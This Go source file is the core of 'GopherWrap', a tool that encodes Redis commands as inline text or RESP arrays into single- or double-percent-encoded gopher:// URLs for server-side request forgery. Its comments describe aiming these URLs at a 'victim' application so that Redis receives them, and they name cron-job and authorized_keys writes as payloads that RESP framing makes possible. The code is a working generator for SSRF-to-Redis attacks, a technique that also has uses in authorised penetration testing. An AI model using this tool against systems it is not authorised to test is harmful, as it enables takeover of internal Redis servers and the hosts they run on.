// GopherWrap turns Redis commands into a gopher:// URL for SSRF testing.
// Every command is terminated with CRLF automatically, then the whole
// payload is percent-encoded and wrapped in a gopher URL.
//
// This file holds the pure core of the tool: validation and encoding are
// side-effect-free functions over immutable values. All IO lives at the
// edges (main.go / interactive.go), so the encoding pipeline is trivially
// testable and composable.
package main

import (
	"fmt"
	"net/netip"
	"strconv"
	"strings"
)

// Config describes one encoding run: where Redis lives, what to send and
// how to frame it. Resp selects RESP multi-bulk framing; the zero value
// keeps the legacy inline-text framing.
type Config struct {
	Host    string
	Port    int
	Payload string
	Resp    bool // frame each command as a RESP array instead of inline text
}

// Result is the fully encoded output of one run — an immutable snapshot.
type Result struct {
	Host     string   // normalised for the URL (IPv6 bracketed)
	Port     int      // validated port
	Commands []string // one Redis command per entry, as typed
	Framing  string   // "inline" (CRLF text) or "RESP" (multi-bulk arrays)
	Wire     string   // exact bytes Redis receives
	Encoded  string   // percent-encoded wire payload
	URL      string   // final gopher:// URL, single-encoded
	Double   string   // URL re-encoded, for targets that decode once first
}

// Default returns the starting configuration shown on first launch.
func Default() Config {
	return Config{Host: "127.0.0.1", Port: 6379, Payload: "SET test hello"}
}

// ---- validation ----------------------------------------------------------

// validatePort checks a port number.
func validatePort(p int) error {
	if p < 1 || p > 65535 {
		return fmt.Errorf("port must be between 1 and 65535, got %d", p)
	}
	return nil
}

// parsePort validates a port typed by the user.
func parsePort(raw string) (int, error) {
	p, err := strconv.Atoi(strings.TrimSpace(raw))
	if err != nil {
		return 0, fmt.Errorf("port must be a number, got %q", strings.TrimSpace(raw))
	}
	return p, validatePort(p)
}

// formatHost normalises and validates a host: trims surrounding space and
// brackets IPv6 addresses. Anything that could smuggle bytes into the URL
// (a scheme, path, port or whitespace) is rejected.
func formatHost(raw string) (string, error) {
	host := strings.TrimSpace(raw)
	switch {
	case host == "":
		return "", fmt.Errorf("host must not be empty")
	case strings.ContainsAny(host, " \t\r\n"):
		return "", fmt.Errorf("host must not contain whitespace")
	case strings.ContainsAny(host, "/?#%"):
		return "", fmt.Errorf("host must be a bare hostname or IP — no scheme, path, query or port")
	case strings.Contains(host, ":"):
		inner := strings.TrimSuffix(strings.TrimPrefix(host, "["), "]")
		if _, err := netip.ParseAddr(inner); err != nil {
			return "", fmt.Errorf("%q is not a valid IPv6 address (the port goes in the port field)", host)
		}
		return "[" + inner + "]", nil
	case !validHostname(host):
		return "", fmt.Errorf("%q is not a valid hostname", host)
	}
	return host, nil
}

// validHostname reports whether h is a plain DNS/IPv4-style name made of
// URL-safe characters only.
func validHostname(h string) bool {
	if h == "" || len(h) > 253 {
		return false
	}
	for i := 0; i < len(h); i++ {
		c := h[i]
		switch {
		case c >= 'a' && c <= 'z', c >= 'A' && c <= 'Z', c >= '0' && c <= '9',
			c == '.', c == '-', c == '_', c == '~':
		default:
			return false
		}
	}
	return true
}

// ---- payload pipeline ----------------------------------------------------
//
// The encoding flow is a pure composition:
//
//	splitCommands → wire(cmds) → percentEncode → assembleURL
//
// each step transforming an immutable value into the next, with encode/1 as
// the top-level pipeline for one run. wire is commandsToWire (inline CRLF
// text) or commandsToRESP (multi-bulk arrays), chosen by Config.Resp.

// mapSlice returns a new slice with fn applied to every element of xs.
func mapSlice[T, U any](xs []T, fn func(T) U) []U {
	out := make([]U, len(xs))
	for i, x := range xs {
		out[i] = fn(x)
	}
	return out
}

// filterSlice returns a new slice holding only the elements keep accepts.
func filterSlice[T any](xs []T, keep func(T) bool) []T {
	out := make([]T, 0, len(xs))
	for _, x := range xs {
		if keep(x) {
			out = append(out, x)
		}
	}
	return out
}

// splitCommands splits a payload into individual Redis commands: trim each
// line, drop the blanks. Stray blank lines and pasted CRLF endings are
// tolerated, so raw copied text encodes cleanly.
func splitCommands(payload string) []string {
	return filterSlice(
		mapSlice(strings.Split(payload, "\n"), strings.TrimSpace),
		func(cmd string) bool { return cmd != "" },
	)
}

// appendCRLF terminates one command with the CRLF Redis expects.
func appendCRLF(cmd string) string { return cmd + "\r\n" }

// commandsToWire folds the commands into the exact byte stream Redis
// receives: every command followed by CRLF, back to back.
func commandsToWire(cmds []string) string {
	return strings.Join(mapSlice(cmds, appendCRLF), "")
}

// ---- RESP framing ---------------------------------------------------------
//
// Inline text (above) relies on the Redis server to split each line into
// arguments; a CRLF inside any argument would end the command early. RESP
// multi-bulk arrays instead prefix every argument with its byte length, so
// the tool splits arguments client-side and any byte — newlines included —
// travels safely inside a frame. This is what makes payloads that must
// carry \n (cron jobs, authorized_keys) possible.

// splitArgs splits one command line into its arguments using the syntax
// Redis accepts for inline commands, so RESP mode takes the same input as
// inline mode. Runs of whitespace separate arguments; "double quotes"
// group text into one argument and decode backslash escapes (\n \r \t
// \b \a \v \f \\ \" \' and \xHH) into real bytes; 'single quotes' group
// literally, with \' the only escape. A closing quote must end the
// argument (Redis enforces the same). Unlike Redis — which passes an
// unknown escape's character through silently — an unknown escape is
// rejected: in a tool that turns text into bytes, a silently dropped
// backslash would corrupt the payload.
func splitArgs(cmd string) ([]string, error) {
	var args []string
	var cur strings.Builder
	inDQ, inSQ := false, false // inside "double" / 'single' quotes
	started := false           // an argument is being built
	for i := 0; i < len(cmd); {
		c := cmd[i]
		switch {
		case inDQ:
			switch {
			case c == '\\':
				b, next, err := dqEscape(cmd, i)
				if err != nil {
					return nil, err
				}
				cur.WriteByte(b)
				i = next
			case c == '"':
				if i+1 < len(cmd) && !isArgSpace(cmd[i+1]) {
					return nil, fmt.Errorf("character %q right after a closing \" quote", cmd[i+1])
				}
				inDQ = false
				i++
			default:
				cur.WriteByte(c)
				i++
			}
		case inSQ:
			switch {
			case c == '\\' && i+1 < len(cmd) && cmd[i+1] == '\'':
				cur.WriteByte('\'')
				i += 2
			case c == '\'':
				if i+1 < len(cmd) && !isArgSpace(cmd[i+1]) {
					return nil, fmt.Errorf("character %q right after a closing ' quote", cmd[i+1])
				}
				inSQ = false
				i++
			default:
				cur.WriteByte(c)
				i++
			}
		case c == '"':
			inDQ, started = true, true
			i++
		case c == '\'':
			inSQ, started = true, true
			i++
		case c == ' ' || c == '\t':
			if started {
				args = append(args, cur.String())
				cur.Reset()
				started = false
			}
			i++
		default:
			cur.WriteByte(c)
			started = true
			i++
		}
	}
	if inDQ {
		return nil, fmt.Errorf("unterminated \" quote")
	}
	if inSQ {
		return nil, fmt.Errorf("unterminated ' quote")
	}
	if started {
		args = append(args, cur.String())
	}
	return args, nil
}

// isArgSpace reports whether c separates arguments.
func isArgSpace(c byte) bool { return c == ' ' || c == '\t' }

// dqEscape decodes the backslash escape starting at cmd[i] and returns the
// decoded byte plus the index just past the sequence.
func dqEscape(cmd string, i int) (byte, int, error) {
	if i+1 >= len(cmd) {
		return 0, i, fmt.Errorf("dangling backslash in \" quoted argument")
	}
	c := cmd[i+1]
	if c == 'x' {
		if i+3 >= len(cmd) || !isHex(cmd[i+2]) || !isHex(cmd[i+3]) {
			return 0, i, fmt.Errorf("\\x escape needs two hex digits")
		}
		v, _ := strconv.ParseUint(cmd[i+2:i+4], 16, 8)
		return byte(v), i + 4, nil
	}
	switch c {
	case 'n':
		return '\n', i + 2, nil
	case 'r':
		return '\r', i + 2, nil
	case 't':
		return '\t', i + 2, nil
	case 'b':
		return '\b', i + 2, nil
	case 'a':
		return '\a', i + 2, nil
	case 'v':
		return '\v', i + 2, nil
	case 'f':
		return '\f', i + 2, nil
	case '\\':
		return '\\', i + 2, nil
	case '"':
		return '"', i + 2, nil
	case '\'':
		return '\'', i + 2, nil
	}
	return 0, i, fmt.Errorf("unknown escape \\%c in \" quoted argument", c)
}

// isHex reports whether c is an ASCII hex digit.
func isHex(c byte) bool {
	return c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F'
}

// respFrame wraps one argument list in a RESP array: *count then one
// $len<CRLF>bytes<CRLF> bulk string per argument. Lengths are in bytes,
// which is exactly what RESP requires after escapes are decoded.
func respFrame(args []string) string {
	var b strings.Builder
	fmt.Fprintf(&b, "*%d\r\n", len(args))
	for _, a := range args {
		fmt.Fprintf(&b, "$%d\r\n%s\r\n", len(a), a)
	}
	return b.String()
}

// commandsToRESP folds the commands into back-to-back RESP arrays — valid
// RESP pipelining, one array per command. A line that cannot be tokenized
// (unbalanced quotes, broken escape) errors with its command number.
func commandsToRESP(cmds []string) (string, error) {
	var b strings.Builder
	for i, cmd := range cmds {
		args, err := splitArgs(cmd)
		if err != nil {
			return "", fmt.Errorf("command %d: %w", i+1, err)
		}
		b.WriteString(respFrame(args))
	}
	return b.String(), nil
}

// percentEncode URL-encodes every byte except ASCII letters and digits.
// Nothing else survives unencoded: spaces become %20, slashes %2F and the
// CRLF terminators %0D%0A, so no parser layer between the victim and Redis
// can mangle the payload.
func percentEncode(s string) string {
	var b strings.Builder
	b.Grow(len(s) * 3)
	for i := 0; i < len(s); i++ {
		if c := s[i]; isAlphaNum(c) {
			b.WriteByte(c)
		} else {
			fmt.Fprintf(&b, "%%%02X", c)
		}
	}
	return b.String()
}

// isAlphaNum reports whether c is an ASCII letter or digit.
func isAlphaNum(c byte) bool {
	return c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9'
}

// assembleURL wraps an encoded payload in a gopher:// URL. The underscore
// occupies the byte gopher clients parse as an item type, so the first
// payload byte is never consumed.
func assembleURL(host string, port int, encoded string) string {
	return "gopher://" + host + ":" + strconv.Itoa(port) + "/_" + encoded
}

// doubleEncode re-encodes an already-encoded URL with the same encoder, so
// every byte of the URL is percent-encoded twice. One decoding pass by the
// vulnerable application yields the plain gopher URL above.
func doubleEncode(url string) string {
	return percentEncode(url)
}

// encode runs the whole pipeline for one config: split → frame → encode →
// wrap. It returns a Result plus any validation error.
func encode(cfg Config) (Result, error) {
	if err := validatePort(cfg.Port); err != nil {
		return Result{}, err
	}
	host, err := formatHost(cfg.Host)
	if err != nil {
		return Result{}, err
	}
	cmds := splitCommands(cfg.Payload)
	if len(cmds) == 0 {
		return Result{}, fmt.Errorf("payload has no Redis commands")
	}
	var wire string
	framing := "inline"
	if cfg.Resp {
		if wire, err = commandsToRESP(cmds); err != nil {
			return Result{}, err
		}
		framing = "RESP"
	} else {
		wire = commandsToWire(cmds)
	}
	enc := percentEncode(wire)
	url := assembleURL(host, cfg.Port, enc)
	return Result{
		Host:     host,
		Port:     cfg.Port,
		Commands: cmds,
		Framing:  framing,
		Wire:     wire,
		Encoded:  enc,
		URL:      url,
		Double:   doubleEncode(url),
	}, nil
}

// escapeVisible renders CR, LF and TAB as backslash escapes so the wire
// bytes can be shown literally in the terminal.
func escapeVisible(s string) string {
	r := strings.NewReplacer(`\`, `\\`, "\r", `\r`, "\n", `\n`, "\t", `\t`)
	return r.Replace(s)
}
